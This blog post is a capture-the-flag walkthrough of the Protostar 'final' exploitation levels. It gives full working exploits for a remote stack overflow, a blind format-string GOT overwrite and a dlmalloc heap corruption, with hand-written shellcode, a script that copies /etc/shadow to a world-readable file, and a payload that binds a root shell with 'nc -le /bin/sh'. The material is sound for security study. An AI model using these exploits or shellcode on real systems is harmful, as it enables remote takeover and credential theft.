---

layout: post
title:  "Protostar Exploit Exercises: Final challenges"
author: jonatanhal

---

## [final0](https://exploit-exercises.com/protostar/final0/)

>## About
>
>This level combines a stack overflow and network programming for a remote overflow.
>
>Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode.
>
>Core files will be in /tmp.

If we compile our own version of the final0 program, we can use it
to learn things about the way that the stack should look in the real
version.

~~~
$ gdb -q ./a.out
(gdb) # We put a breakpoint on the line of the call to gets
(gdb) break 21
(gdb) c
(gdb) x/2a $ebp
0xbffff7b8:		0xbffff7e8		0x80485eb <main+14>
(gdb) x/x buffer
0xbffff5a8:		0x00000000
(gdb) p/x 0x7b8-0x5a8
$1 = 0x210
(gdb) # We can conclude that &buffer+0x214 == &savedReturnAddress
~~~

With that in mind, it's really simple to gain control of the program counter.

~~~
(gdb) shell python -c "print 'A'*0x214+'\xef\xbe\xad\xde'" > final0input
(gdb) start < final0input
Start it from the beginning? (y or n) y
Temporary breakpoint 7 at 0x80485e6: file final0.c, line 42.
Starting program: /home/user/a.out < final0input
...
(gdb) c

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
~~~

Having to deal with `toupper()` basically means that any byte that's
between 0x61 (`a`) & 0x7a (`z`) in the buffer will be subtracted by
0x20 (aka converted into uppercase). 

This means that our shellcode can't simply push the values 0x6e69622f
(`/bin`) & 0x68732f2f (`//sh`) - and later, when those values are
interpreted as a string, actually resolve to a existing path.

Unless you're running linux and have uppercase copies of every path on
your system.

A common technique to sidestep this issue when writing shellcode is to
push a value that is then modified to, in the end result in a lowercase,
valid path.

**Pro-tip: It's simple to convert from a regular path to a encoded path in python**

{% highlight python %}
>>> ' '.join(hex(ord(i) ^ 0xf0)[2:] for i in '/bin')
'df 92 99 9e'
>>> ' '.join(hex(ord(i) ^ 0xf0)[2:] for i in '//sh')
'df df 83 98'
{% endhighlight %}

To get the original ASCII back, we just xor the value again with 0xf0f0f0f0.

#### Aiming for the stars, landing on the moon.

Before I looked for the buffer in the core-dumps. My assumption was
that the buffer was located at 0xbffff5a8 (which I got from examining
my own version of the program), but that was off by about 1184 (0x4a0)
bytes.

After looking through a couple of shellcodes available from
exploit-db.com, I lost patience and decided to write my own.

{% highlight nasm %}
;; Shellcode to execute /tmp/exe via systemcall 11 (execve)
xor eax,eax          ; clear eax
push eax             ; push nullbyte onto the stack
mov eax, 0x958895df  ; '/exe'
xor eax, 0xf0f0f0f0  ; turn it back to ascii
push eax             ; push it onto the stack
mov eax, 0x809d84df  ; '/tmp'
xor eax, 0xf0f0f0f0
push eax             ; push the ascii onto the stack
mov eax, 11          ; specify systemcall 11 (execve)
mov ebx, esp         ; ebx should point to the command to execute
; Note:
; ecx & edx should contain pointers to enviroment-variables &
; arguments to be passed into the function. We do not give a hoot
; about these things though. So we just pass nulls
xor ecx, ecx
xor edx, edx
int 0x80             ; call kernel
{% endhighlight %}

{% highlight python %}
# final0_solution.py
import socket, struct

HOST="localhost"
PORT=2995
SHELLCODE=":)" # <- Be careful of dangerous cyber codez
SLEDLENGTH=32
SLED='\x90'*SLEDLENGTH
ADDRESS='\x48\xfa\xff\xbf' 
OVERFLOW='A'*(0x214-len(SHELLCODE) - SLEDLENGTH)+ADDRESS

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(SLED+SHELLCODE+OVERFLOW)
{% endhighlight %}


The file that's being executed by our shellcode is just an example
of what's possible.

{% highlight bash %}
#!/bin/bash
# File: /tmp/exe
cp /etc/shadow /tmp/shadow
chmod 777 /tmp/shadow
{% endhighlight %}

~~~
$ python final0_solution.py
$ grep root /tmp/shadow 
root:$6$gOA4/iAf$EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.riaGhLmESwWwB7Rnntu5JCDnRnOUTeeYWQk.iUq0:15302:0:99999:
~~~

![Success]({{ site-url }}/assets/post_images/protostar_final0_success.gif)

* * * 

## [final1](https://exploit-exercises.com/protostar/final1/)

> ## About
>
>This level is a remote blind format string level. The ‘already
>written’ bytes can be variable, and is based upon the length of the
>IP address and port number.
>
>When you are exploiting this and you don’t necessarily know your IP
>address and port number (proxy, NAT / DNAT, etc), you can determine
>that the string is properly aligned by seeing if it crashes or not
>when writing to an address you know is good.

For those of you who are not familiar with formatting-exploits, I
would suggest to go back and read up on the basics (shameless promo:
[my post on formatting exploits]({% post_url
2016-01-28-protostar-formats %}), or maybe
[this paper](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)
by scut / team teso).

## Crashing the application.
  
  Using input `"%08x"*10+"%n"` we get segfault @ `0x312e3836`, instruction-pointer `0xb7ed7a59` & stack-pointer `0xbffff364`.
  
  Another way of crashing the application would be to just send `%n`.
  
  Segmentationfault occurs because of `mov DWORD PTR [eax], edx`, why?
  
  * eax is previously set to edi, which I believe corresponds to the
    parameter-pointer used by printf.
  
  * edx is the amount of bytes written so far.
  
  By advancing the internal parameter-pointer with some `%08x` formatters,
  we can make printf read parameters from the buffer itself.
  
  Reusing the python-code we wrote earlier, we can send some stuff like this
  
{% highlight python %}
s.send("username "+ " \xff\xff\xff\xff"+"%08x"*14+"%n" + chr(0xa))
{% endhighlight %}

And observe that, upon crashing, eax is `0xffffffff`.

#### Vulnerable codes

Looking at the source, `syslog(LOG_USER|LOG_DEBUG, buf);` (lineno 19) is
our entry-point or whatever you might call it.

Opening up `man 3 syslog`, we contemplate over the following passage.

>Never pass a string with user-supplied data as a format, use the following instead:
>
>`syslog(priority, "%s", string);`

So `syslog(priority, userInput)` is somewhat equal to `printf(userInput)`.

### **BONUS**: Working with GDB and coredumps

When loading up a coredump in gdb, `$ gdb -c <coredump>`, any
non-stripped symbols from a executable are not loaded automagically.
Which means that if we want look at things like local variables,
functions - we simply can't. After opening a core-file, loading
the executables symbols can be done via the file-command.

For example, `(gdb) file /opt/protostar/bin/final1`.

#### Sharing is caring

In the mysterious case of final1, where the initial crash occurred in the
shared library function printf, or `__IO_vfprintf_interal` specifically; 
If we're working with a core-file and want to take a look at code from
a shared library; entering the `sharedlibrary` command makes sure that 
the relevant code is loaded for us to examine.

### Achievement Unlocked: Control over program counter!

I achieved control over the program-counter by running the following
piece of python code.

{% highlight python %}
s.send("username "+\
       " \x94\xa1\x04\x08\x95\xa1\x04\x08\x96\xa1\x04\x08\x97\xa1\x04\x08"+\
       "%15$n" +\
       "%16$n" +\
       "%17$n" +\
       "%18$n" +\
       chr(0xa))
s.send("login"+(chr(0xa)))
{% endhighlight %}

~~~ 
(gdb) x/i $eip
0x30303030:		Cannot access memory at address 0x30303030
~~~

I overwrote the entry for `puts` in the global offset table with 0x30. 

~~~
$ objdump -R /opt/protostar/bin/final1 | grep puts
0804a194 R_386_JUMP_SLOT   puts
~~~

There are still two things to be done.

#### 1. Write some shellcode that will do `$what_we_want`
{% highlight nasm %}
; Uncomment the following two lines if you want to compile this shellcode into a executable.
; global _start
; _start:
xor eax,eax      ; eax = 0
push eax         ; push nullbyte onto the stack
push 0x6578652f  ; push '/exe' onto the stack
push 0x706d742f  ; push '/tmp' onto the stack
; If we instead would write 'mov eax, 11', nasm would produce bytecode with nullbytes.
; Because the code would move 0x0000000b into eax. We already nulled the rest of eax,
; so we're good to go.
mov al, 11       ; specify execve systemcall
mov ebx, esp     ; Address of the string which contains our command should be in ebx
; Much like the previous shellcode we wrote;
;  ecx & edx should contain pointers to enviroment-variables &
;  arguments to be passed into the function. We do not give a hoot
;  about these things though. So we just pass nulls
xor ecx, ecx
xor edx, edx
int 0x80         ; call kernel
xor eax,eax      ; null out eax
mov al, 1        ; specify exit systemcall
int 0x80         ; call kernel
{% endhighlight %}

Inside `/tmp/exe` we put whatever we want, and through the magic of television; I prepared 
`/tmp/exe` with the following contents. Make sure to `chmod` it, so it's possible to execute it.

{% highlight sh %}
#!/bin/bash
echo 'Success!' > /tmp/lol
{% endhighlight %}

*Pro-tip: When building my shellcode; I compiled it using nasm, sent it to my guest
protostar VM and linked it using `ld`. At this point I had a working executable that
I could execute and see if the damn thing worked or handed me back a SIGSEGV* 

#### 2. Overwrite the `puts`-entry in the GOT with the address of our shellcode.

This step took some tinkering to get working. Because of some leading
text in the string, I had to 1) work out how many characters to write in order
to achieve the correct string-length to write `%n`, and 2) make sure that 
my `%$NUMn` parameters were hitting the addresses in my input, while also 
aligning my string to 4bytes. There's a better way to do this.

After a lot of decrementing, shifting, tinkering and gdbing, I got my exploit working.

### Putting all the pieces together

{% highlight python %}
# final1_solution.py
import socket, struct

HOST="localhost"
PORT=2994
SHELLCODE="\x31\xc0\x50\x68\x2f\x65\x78\x65\x68\x2f\x74\x6d\x70\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send("username "+\
       SHELLCODE+ "A"*12 +\
       "\x94\xa1\x04\x08"+\
       "\x95\xa1\x04\x08"+\
       "\x96\xa1\x04\x08"+\
       "\x97\xa1\x04\x08"+\
       "%119d" + "%25$n" +\
       "%42d"  + "%26$n" +\
       "______"+ "%27$n" +\
       "%192d" + "%28$n" +\
       chr(0xa))
s.send("login " + chr(0xa))

s.close()
{% endhighlight %}

~~~
$ python final1_solution.py
$ cat /tmp/lol
Success!
~~~

![Success]({{ site-url }}/assets/post_images/protostar_final1_success.gif)

* * * 

## [final2](https://exploit-exercises.com/protostar/final2/)

> ### About
 > 
> Remote heap level :)

I would prefer a more explicit explanation. Having wrestled with this
level for some time now, it's a shame the folks over at
exploit-exercises didn't make this challenge more explicit; Word on the
street is that the code provided on the website does not represent the
binary found within the system.

The print-statement in the `check_path` function never echoes back either;
so something is probably wrong.

I looked at the author of secwriteups solution to the problem when I
got stuck on this level, I was having some trouble with getting the program
to crash & secwriteups-post helped me a lot in progressing. 
[Link Secwriteups post](http://secwriteups.blogspot.se/2015/02/protostar-final-2.html)

The beginning goal is obviously to make it crash during the call to
free, which we did the previous time we were exploiting dl-malloc.

From there, we can probably poke around enough to make sense of it all
enough to be able to exploit things.

{% highlight python %}
import socket

TARGET=("127.0.0.1", 2993)
s=socket.create_connection(TARGET)
payload='FSRD'+'A'*123+'/' + 'FSRD'+'ROOT/'+'B'*119
s.sendall(payload)
s.close()

{% endhighlight %}

Running the code listed above generated the following crash:

~~~
root@protostar:/home/user# pidof final2
1485
root@protostar:/home/user# gdb -q -p 1485
Attaching to process 1485
[ snip-snip ]
(gdb) c
Continuing.
[New process 27314]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 27314]
0x0804aabf in free (mem=0x804e008) at final2/../common/malloc.c:3643
3643	final2/../common/malloc.c: No such file or directory.
	in final2/../common/malloc.c
0x0804aabf <free+253>:	 8b 40 04	mov    eax,DWORD PTR [eax+0x4]
0x0804aac2 <free+256>:	 83 e0 01	and    eax,0x1
0x0804aac5 <free+259>:	 89 45 e0	mov    DWORD PTR [ebp-0x20],eax
(gdb) x/x nextsize
0x42424240:	Cannot access memory at address 0x42424240
~~~

Last time we exploited dlmalloc, we had a clear goal, redirect
execution into the target function. This time we can do whatever
we want. Let's just keep it simple and shove some shellcode
in there. 

## We did it!

Ladies and gentlemen, I've struggled a whole bunch with this level,
but I am proud to present to you, my own damn exploit that runs
`nc -le /bin/sh`, which allows me to connect to the randomly generated
port that the backdoor is listening to.

Upon connecting, we can let out a sigh of relief & rest assured that we
are root.

~~~
$ python final02.py
$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
...
tcp        0      0 *:53955                 *:*                     LISTEN     
...
$ nc localhost 53955
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
~~~

There you have it. For the sake of completeness, here's the exploit I
wrote.

{% highlight python %}

from struct import pack
import socket

HOST="127.0.0.1"
PORT=2993
SHELLCODE="\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" # Relative jump + nopsled ahoy
SHELLCODE+="\x31\xc0\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x62\x69\x6e\x2f\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x57\x56\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

ADDRS='\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + \
    pack('L', 0x0804d41c-12) + pack('L', 0x804e010)

s=socket.create_connection((HOST, PORT))
# &buf should be around 0x804e00c
part0='FSRD'+'JUNK'+SHELLCODE+'A'*(119-len(SHELLCODE))+'/' 
part1='FSRD'+'ROOT/'+ ADDRS + 'B'*(119-len(ADDRS))
payload=part0+part1
s.sendall(payload)
s.close()
{% endhighlight %}

![Success]({{ site-url }}/assets/post_images/protostar_final2_success.gif)

* * *

We've been through thick and thin, cried some, failed until hell froze
over, laughed a whole lot and maybe even learned a thing or two, but
we are officially done with the protostar challenges. FeelsGreatMan

It's been a lot of fun trying to get my shellcode working and trying
to exploit these sets of challenges. I've already started working on
the [fusion](https://exploit-exercises.com/fusion/) set of challenges, so keep an eye on my blog for
solutions to those problems.

In the mean-while, have a good one & thanks for reading.



